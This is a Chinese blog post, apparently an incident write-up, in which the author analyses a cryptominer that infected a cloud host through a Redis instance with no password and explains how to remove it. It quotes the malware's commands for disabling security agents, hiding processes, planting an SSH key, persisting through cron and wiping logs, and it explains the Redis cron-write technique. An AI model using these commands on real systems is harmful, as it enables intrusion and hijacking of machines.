@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.wudi.space","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="今天快吃午饭，收到了云服务器运营商发来的短信，告知我余额不足以支撑3天。我寻思着按我之前的消费情况，里面的余额够我用很久呢，怎么突然就不够了。在半小时的排查后，发现了自己的云主机竟然已经成为了别人的矿机，这和我之前某一次线上遇到的场景极为相似。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="云主机被植入挖矿病毒后">
+<meta property="og:url" content="https://www.wudi.space/2021/01/13/ExperienceOfMinerVirus/index.html">
+<meta property="og:site_name" content="吴迪小站">
+<meta property="og:description" content="今天快吃午饭，收到了云服务器运营商发来的短信，告知我余额不足以支撑3天。我寻思着按我之前的消费情况，里面的余额够我用很久呢，怎么突然就不够了。在半小时的排查后，发现了自己的云主机竟然已经成为了别人的矿机，这和我之前某一次线上遇到的场景极为相似。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.wudi.space/2021/01/13/ExperienceOfMinerVirus/QcloudNotification.png">
+<meta property="og:image" content="https://www.wudi.space/2021/01/13/ExperienceOfMinerVirus/SecureFile.png">
+<meta property="article:published_time" content="2021-01-13T07:10:29.000Z">
+<meta property="article:modified_time" content="2021-01-14T03:31:17.798Z">
+<meta property="article:author" content="吴迪">
+<meta property="article:tag" content="Redis">
+<meta property="article:tag" content="病毒">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.wudi.space/2021/01/13/ExperienceOfMinerVirus/QcloudNotification.png">
+
+<link rel="canonical" href="https://www.wudi.space/2021/01/13/ExperienceOfMinerVirus/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>云主机被植入挖矿病毒后 | 吴迪小站</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">吴迪小站</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.wudi.space/2021/01/13/ExperienceOfMinerVirus/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg?raw=true">
+      <meta itemprop="name" content="吴迪">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="吴迪小站">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          云主机被植入挖矿病毒后
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-13 15:10:29" itemprop="dateCreated datePublished" datetime="2021-01-13T15:10:29+08:00">2021-01-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-14 11:31:17" itemprop="dateModified" datetime="2021-01-14T11:31:17+08:00">2021-01-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%82%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">杂记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>今天快吃午饭，收到了云服务器运营商发来的短信，告知我余额不足以支撑3天。我寻思着按我之前的消费情况，里面的余额够我用很久呢，怎么突然就不够了。在半小时的排查后，发现了自己的云主机竟然已经成为了别人的矿机，这和我之前某一次线上遇到的场景极为相似。 </p>
+<a id="more"></a>
+<h1 id="缘起"><span class="post-title-index">1. </span><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>由于事发突然，每小时都在走RMB，中间也没想起来截图-，-就以文字的形式记录下来。  </p>
+<p>事情是这样的，腾讯云给我发来余额预警之后，由于我设置的是按流量算钱的，我第一反应就是我流量被偷跑了。由于本身没有运行什么服务。再加上比较谨慎，出口带宽被设置的比较小，所以平时每月也就1毛钱左右的花费。一夜之间竟然偷跑了我十几块。<br>于是我立刻登录腾讯云，看到即使到现在，流量也依然持续在每分钟10MB左右。<br>立刻远程登录云主机，利用top、iptop等命令一通操作，结果内容却比较和谐，查看<code>/var/log/secure</code>等日志发现所有的安全日志、操作日志之类的已经被全部清空了。  </p>
+<p>考虑到昨天刚把redis的保护密码去掉，就立刻客户端登录redis，发现里面的key都被清掉了，只留了几个backup1、backup2之类的。这些的值形似<code>\n\n* * * * /bin/bash -i&gt;&amp; xxxxxx</code>。看上去很像cron表达式。 </p>
+<p>这样的话，赶紧去查看系统的定时任务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><br>里面果然有一条，是定时下载某一网址下的<code>.sh</code>脚本并执行的任务。于是，我将这个脚本下载下来(脚本在<a target="_blank" href="init.sh.DoNotExec">这里</a>，本来是没有“DoNotExec”后缀的，为了防止误执行，我删掉了指定脚本命令解释器的标记，在开头增加了直接退出的命令，同时去掉了文件的可执行属性)。  </p>
+<p>本着要删掉病毒，首先要防止病毒复活，那么首先就要把这个定时任务先关掉。但是修改crontab脚本后，却无法保存，提示<code>Operation not permitted</code>。这就很恼火</p>
+<h1 id="脚本分析"><span class="post-title-index">2. </span><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h1><p>打开该脚本文件之后，长度近1000行，大致浏览了一下，发现有500多行都是一个函数，这个函数也是十分搞笑，待会儿来说。  </p>
+<p>这个脚本开头将Linux的安全子系统SeLinux关闭了，然后将常用的几个命令改了个名字：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0 2&gt;dev/null</span><br><span class="line"><span class="built_in">echo</span> SELINUX=disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/null</span><br><span class="line">sync &amp;&amp; <span class="built_in">echo</span> 3 &gt;/proc/sys/vm/drop_caches</span><br><span class="line">mv /usr/bin/curl /usr/bin/url</span><br><span class="line">mv /usr/bin/url /usr/bin/cd1</span><br><span class="line">mv /usr/bin/wget /usr/bin/get</span><br><span class="line">mv /usr/bin/get /usr/bin/wd1</span><br><span class="line">mv /usr/bin/cur /usr/bin/cd1</span><br><span class="line">mv /usr/bin/cdt /usr/bin/cd1</span><br><span class="line">mv /usr/bin/wge /usr/bin/wd1</span><br><span class="line">mv /usr/bin/wdt /usr/bin/wd1</span><br></pre></td></tr></table></figure><br>也不知道将这几个名字反复mv来mv去到底有什么意义。 此外drop_caches似乎是用来清理缓存的，意思是接下来病毒要干一番大的了么。  </p>
+<p>接下来，这个脚本又卸载了阿里云和腾讯云的防护程序：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ps aux | grep -i <span class="string">'[a]liyun'</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  pkill aliyun-service</span><br><span class="line">  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service</span><br><span class="line">  rm -rf /usr/<span class="built_in">local</span>/aegis*</span><br><span class="line">  systemctl stop aliyun.service</span><br><span class="line">  systemctl <span class="built_in">disable</span> aliyun.service</span><br><span class="line">  service bcm-agent stop</span><br><span class="line">  yum remove bcm-agent -y</span><br><span class="line">  apt-get remove bcm-agent -y</span><br><span class="line"><span class="keyword">elif</span> ps aux | grep -i <span class="string">'[y]unjing'</span>; <span class="keyword">then</span></span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/stargate/admin/uninstall.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/YunJing/uninst.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/monitor/barad/admin/uninstall.sh</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><br>这里我就要吐槽一下腾讯云了，明明卸载的时候你都知道了，为什么不给我发个消息呢？非要等到余额不足的时候你才能提醒我。<br><img src="/2021/01/13/ExperienceOfMinerVirus/QcloudNotification.png" alt="QcloudNotification"></p>
+<p>接下来配置一些挖矿时需要的配置文件之类的，就要开始重头戏了。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">miner_url=<span class="string">"http://199.xx.xx.117/b2f628/zzh"</span></span><br><span class="line">miner_url_backup=<span class="string">"http://106.xx.xx.113/b2f628/zzh"</span></span><br><span class="line">miner_size=<span class="string">"7600464"</span></span><br><span class="line">sh_url=<span class="string">"http://199.xx.xx.117/b2f628/newinit.sh"</span></span><br><span class="line">sh_url_backup=<span class="string">"http://106.xx.xx.113/b2f628/newinit.sh"</span></span><br><span class="line">config_url=<span class="string">"http://199.xx.xx.117/b2f628/config.json"</span></span><br><span class="line">config_url_backup=<span class="string">"http://106.xx.xx.113/b2f628/config.json"</span></span><br><span class="line">config_size=<span class="string">"2732"</span></span><br><span class="line">chattr_size=<span class="string">"8000"</span></span><br><span class="line">rm -f /tmp/.null 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br>接下来是2个shell函数，并执行他们。</p>
+<p>第1个shell函数叫做<code>kill_miner_proc()</code>。它有500多行，稍微看了一下内部的命令，大致是在查找和kill各种进程。所以，如果我料想的不错的话，这个脚本不但要自己挖矿，还要对已经存在宿主机上的其他挖矿程序赶尽杀绝。也是搞笑  </p>
+<p>第2个<code>kill_sus-proc()</code>就比较简单了大致功能是杀死其他无用的程序，为挖矿多腾点资源。  </p>
+<p>再然后定义了<code>lock_cron()</code>和<code>unlock_cron()</code>两个函数，看来这就是我无法删除cron的原因了。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unlock_cron()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R -ia /var/spool/cron</span><br><span class="line">    chattr -ia /etc/crontab</span><br><span class="line">    chattr -R -ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R -ia /etc/cron.d</span><br><span class="line">&#125;</span><br><span class="line">lock_cron()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R +ia /var/spool/cron</span><br><span class="line">    chattr +ia /etc/crontab</span><br><span class="line">    chattr -R +ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R +ia /etc/cron.d</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里利用<code>chattr</code>命令（应该是change attribute的意思吧），应该和Windows上的<code>attrib</code>指令比较像，通过指定+ia或-ia标识该文件添加或移除“不可修改（i)”和“只能追加（a)”两个属性，从而保护内部数据不被修改。  </p>
+<p>接下来利用几个对象代理ps、top等指令，这样既可以避免自己的进程暴露，也能够让运维人员通过这几个指令重新唤醒病毒：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mv /bin/ps /bin/ps.or</span><br><span class="line">sleep 1</span><br><span class="line">mv /bin/ps.or /bin/ps.original	</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"#! /bin/bash"</span>&gt;&gt;/bin/ps</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ps.original \$@ | grep -v \"zzh\|pnscan\""</span>&gt;&gt;/bin/ps</span><br><span class="line">chmod +x /bin/ps</span><br></pre></td></tr></table></figure><br>（同样也是蜜汁操作，不知道为什么要先重命名为ps.or再命名为ps.original）。</p>
+<p>最后就是在它的运行时文件夹<code>$rtdir</code>。如果文件夹不存在就将下载下来存在<code>/tmp</code>下的几个文件挪过来。<br>然后就是配置定时任务保活：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unlock_cron</span><br><span class="line">rm -f <span class="variable">$&#123;crondir&#125;</span></span><br><span class="line">rm -f /etc/cron.d/zzh</span><br><span class="line">rm -f /etc/crontab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"*/30 * * * * sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1"</span> &gt;&gt; <span class="variable">$&#123;crondir&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"*/40 * * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1"</span> &gt;&gt; /etc/cron.d/zzh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"0 1 * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1"</span> &gt;&gt; /etc/crontab</span><br><span class="line"><span class="built_in">echo</span> crontab created</span><br><span class="line">lock_cron</span><br></pre></td></tr></table></figure><br>添加ssh证书<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod 700 /root/.ssh/</span><br><span class="line"><span class="built_in">echo</span> &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line">chmod 600 /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver"</span> &gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><br>然后下载和准备挖矿用的配置文件，还计算了我云主机的CPU核数，要根据核数开线程，啧啧啧。  </p>
+<p>最后就是启动矿机了。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zzh -B --<span class="built_in">log</span>-file=/etc/etc --coin=monero -o stratum+tcp://xmr-asia1.nanopool.org:14444 --threads=<span class="variable">$cpunum</span> -u 43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz -p x &amp;</span><br></pre></td></tr></table></figure></p>
+<p>也不知道为啥准备了半天的配置文件，最后直接在命令上把主要配置都写上去了。 </p>
+<p>然后清理了一下我的防火墙，也不知道为啥这几个端口的OUT TCP要drop掉，我看人家都还写了INPUT的ip。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 5555 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 7777 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 9999 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 9999 -j DROP</span><br><span class="line">service iptables reload</span><br></pre></td></tr></table></figure><br>最后就是擦屁股环节了。难怪所有的记录全都消失了。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> -c</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/spool/mail/root</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/<span class="built_in">log</span>/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/<span class="built_in">log</span>/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /root/.bash_history</span><br></pre></td></tr></table></figure></p>
+<h1 id="清除"><span class="post-title-index">3. </span><a href="#清除" class="headerlink" title="清除"></a>清除</h1><p>把脚本看完，大致的流程就知道了。逆向清理即可。<br>当然，首先要将Redis的密码加上。我本来是设了密码的，图省事，就在redis-cli中通过<code>CONFIG SET requirepass &quot;&quot;</code>将密码临时去掉了，所以重启redis即可。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart redis-server</span><br></pre></td></tr></table></figure><br>如果没有设置过密码的话，快去conf文件中将<code>requirepass</code>开启，并设置复杂的密码。  </p>
+<p>下面如果有删除不掉的，一律都先通过<code>chattr</code>修改只读属性之后，再删除。<br>首先先通过恢复定时任务表的控制权，并清理定时任务：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr -ia /var/spool/cron/crontabs/root</span><br><span class="line"><span class="comment"># 除了删除该文件，也可以vi进去之后删除内容，保留该文件</span></span><br><span class="line"><span class="comment"># crontab -e 然后dd后:wq!</span></span><br><span class="line">rm -f /var/spool.cron/chontabs/root</span><br></pre></td></tr></table></figure><br>接下来恢复系统命令，<code>top</code>和<code>pstree</code>等同理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f /bin/ps</span><br><span class="line">mv /bin/ps.origin /bin/ps</span><br></pre></td></tr></table></figure><br>然后通过ps和top将启动的一些进程杀死，比如<code>zzh</code>、<code>pnscan</code>和不知道什么时候开启的<code>redis-cli</code>等（<code>redis-cli</code>据说是<code>pnscan</code>开启用来连接别的主机用于植入病毒的）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">killall zzh</span><br><span class="line">killall pnscan</span><br><span class="line">killall redis-cli</span><br><span class="line"></span><br><span class="line"><span class="comment"># kill -9 $&#123;pid&#125;</span></span><br></pre></td></tr></table></figure><br>注意到脚本中启动了服务，所以服务也要删掉<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /lib/systemd/system/systemd-update-daily</span><br></pre></td></tr></table></figure><br>然后在<code>kill_miner_proc</code>函数中，还发现几个执行程序，也把他们删掉，并注意一下进程中如果有的话，也把他们关掉。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rm -f /etc/svc*</span><br><span class="line">rm -f /etc/php*</span><br><span class="line">rm -f /etc/zzh*</span><br><span class="line">rm -f /etc/*.sh</span><br></pre></td></tr></table></figure><br>接下来删除黑客的ssh证书<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我的证书放在各个账户下面了，这里是空的，所以直接*了</span></span><br><span class="line">rm -f /root/.ssh/*</span><br></pre></td></tr></table></figure><br>最后根据病毒脚本，将一些没用的配置项和/tmp下的临时文件都删掉<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f /etc/*.json</span><br><span class="line">rm -fR /tmp/*</span><br></pre></td></tr></table></figure><br>这样病毒就差不多清理完了。<br>然后有需要的话，恢复iptables、selinux等。被卸载的云主机守护程序，也可以在云主机运营商的网站上找到恢复的教程。（腾讯云的在<a href="https://cloud.tencent.com/document/product/296/12236" target="_blank" rel="noopener">这里</a>）。 </p>
+<h1 id="Redis后门原理"><span class="post-title-index">4. </span><a href="#Redis后门原理" class="headerlink" title="Redis后门原理"></a>Redis后门原理</h1><p>这个原理其实很简单。大部分redis服务都是在root权限下的，所以其实redis是有全局的读写权限的。<br>而且redis本身在客户端就可以通过<code>CONFIG GET/SET</code>指令获取或修改配置，在没有密码保护的情况下，这个是很危险的。<br>通常黑客在发现redis服务可以访问（无密码或弱密码）后，首先会通过这样的手段修改redis的rdb文件路径和名字：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/spool/cron</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br></pre></td></tr></table></figure><br>没错，将rdb文件修改为root用户的定时任务文件。<br>然后写入几个key，并保存。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> xxoo <span class="string">"\n\n*/1 * * * * somecommand"</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><br>这样一个指令somecommand就以rdb的形式保存到了定时任务中。<br>这个somecommand可以是一个反弹shell的命令（定时一定时间后，让这台肉鸡主动连接到自己机器上，反弹出shell让自己可以操作肉鸡）；而更为普遍的是自动下载一个脚本并自动运行，也就是我所遭遇的这个。<br>可以想见，通过全网扫描redis端口，尝试连接发现没有密码，通过rdb设置定时任务，自动下载病毒初始化脚本，下载配置文件启动矿机程序，挖到矿自动转移到自己的钱包中。这一系列行为都可以自动化完成，天知道有多少主机沦为了矿机、肉鸡。<br>而这一经历也告诉我，暴露在公网上的东西有多危险，一定要设好密码，加强防范。  </p>
+<p>可以看到，最近被扫描的密度还是蛮高的。<br><img src="/2021/01/13/ExperienceOfMinerVirus/SecureFile.png" alt="SecureFile">  </p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Redis/" rel="tag"># Redis</a>
+              <a href="/tags/%E7%97%85%E6%AF%92/" rel="tag"># 病毒</a>
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/06/Cache-03RedisCluster/" rel="prev" title="Cache-03Redis高可用">
+      <i class="fa fa-chevron-left"></i> Cache-03Redis高可用
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
